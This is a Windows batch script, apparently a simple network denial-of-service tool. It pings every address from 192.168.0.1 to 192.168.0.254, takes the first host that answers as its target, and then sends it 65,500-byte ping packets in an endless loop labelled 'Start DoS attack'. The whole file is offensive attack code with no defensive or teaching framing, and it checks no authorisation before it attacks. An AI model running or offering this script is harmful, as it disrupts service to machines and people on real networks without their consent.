@echo off
setlocal enabledelayedexpansion

:: Define the IP range to scan
set "base_ip=192.168.0."
set "start_range=1"
set "end_range=254"

:: Temporary directory for scan results
set "temp_dir=%temp%\scan_results"
mkdir %temp_dir%

:: Start network scan to find available IPs
echo Starting network scan...
for /L %%i in (%start_range%,1,%end_range%) do (
    echo Pinging %base_ip%%%i
    ping -n 1 -w 1000 %base_ip%%%i >nul 2>&1
    if !errorlevel! equ 0 (
        echo %base_ip%%%i is alive
        echo %base_ip%%%i >> %temp_dir%\alive_hosts.txt
    ) else (
        echo %base_ip%%%i is not responding
    )
)

:: Check if any IP addresses were found
if not exist %temp_dir%\alive_hosts.txt (
    echo No available IP addresses found in the network.
    goto end
)

:: Select the first found available IP address
set /p target=<%temp_dir%\alive_hosts.txt
echo Available IP found: %target%

:: Attack settings
set "packet_size=65500"
set "ping_count=1000000"

:: Start DoS attack
:attack
echo Starting DoS attack on %target%
ping -l %packet_size% -n 1 %target%
goto attack

:end
echo Process completed.
exit /b